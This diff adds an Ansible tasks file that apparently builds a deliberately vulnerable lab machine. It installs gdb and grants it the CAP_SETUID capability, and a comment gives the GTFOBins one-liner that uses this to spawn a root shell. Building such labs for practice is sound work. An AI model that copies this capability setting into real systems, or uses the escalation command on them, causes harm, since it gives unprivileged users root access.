@@ -1,0 +1,12 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/gdb/#capabilities
+# Exploit: gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit /dev/null
+- name: (privesc/cap_gdb) Install gdb
+  ansible.builtin.apt:
+    name: gdb
+    state: present
+    update_cache: true
+
+- name: (privesc/cap_gdb) Set CAP_SETUID on /usr/bin/gdb
+  ansible.builtin.command: setcap cap_setuid+eip /usr/bin/gdb
+  changed_when: true
